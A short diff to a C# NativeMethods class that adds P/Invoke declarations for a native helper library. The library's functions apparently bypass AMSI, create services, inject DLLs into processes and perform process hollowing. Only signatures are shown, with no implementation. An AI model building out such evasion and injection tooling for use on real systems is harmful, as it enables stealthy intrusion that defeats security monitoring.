@@ -39,6 +39,16 @@ public class NativeMethods
 
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
     public static extern int AmsiBypass();
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int createSrv(string appname, string srvname, string desc);
 
+	[DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+	public static extern int InjectDll(int targetId, string dllLibFullPath);
+
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+	public static extern int HollowProcess(string targetimage, byte[] replacmentExe, int size);
+
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern bool isx64Exe(string path);
 }
 
